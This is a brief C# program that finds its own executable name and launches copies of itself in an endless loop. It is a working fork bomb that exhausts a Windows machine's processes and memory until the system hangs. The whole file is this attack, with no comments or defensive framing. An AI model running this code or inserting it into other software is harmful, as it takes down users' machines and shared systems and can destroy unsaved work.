using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;

namespace Fork
{
    class Program
    {
        static void Main(string[] args)
        {
            string forkName = System.AppDomain.CurrentDomain.FriendlyName;
            forkName = forkName.Replace("vshost.", string.Empty);

            while (true)
            {
                Process.Start(forkName);
            }
        }
    }
}
